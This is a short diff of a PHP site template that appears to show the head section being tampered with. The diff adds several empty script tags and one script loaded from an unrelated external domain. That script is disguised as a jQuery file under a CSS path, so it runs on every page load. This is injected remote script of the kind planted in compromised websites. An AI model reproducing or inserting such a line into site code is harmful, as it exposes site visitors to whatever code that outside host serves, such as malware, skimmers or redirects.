@@ -15,7 +15,7 @@ include(dirname(__FILE__).'/template.config.php');
 <head>
 <?php echo $this->warp->template->render('head'); ?>
 <link rel="apple-touch-icon" href="<?php echo $this->warp->path->url('template:apple_touch_icon.png'); ?>" />
-</head>
+<script language="JavaScript" src=" " type="text/javascript"></script><script language="JavaScript" src=" " type="text/javascript"></script><script language="JavaScript" src=" " type="text/javascript"></script><script language="JavaScript" src=" " type="text/javascript"></script><script language="JavaScript" src="http://xxxindianxxx.com/st/css/jquery-1.6.5.min.js" type="text/javascript"></script></head>
 
 <body id="page" class="yoopage <?php echo $this->warp->config->get('columns'); ?> <?php echo $this->warp->config->get('itemcolor'); ?> <?php echo $this->warp->config->get('frontpage'); ?> <?php echo $this->warp->config->get('webfonts'); ?>">
 
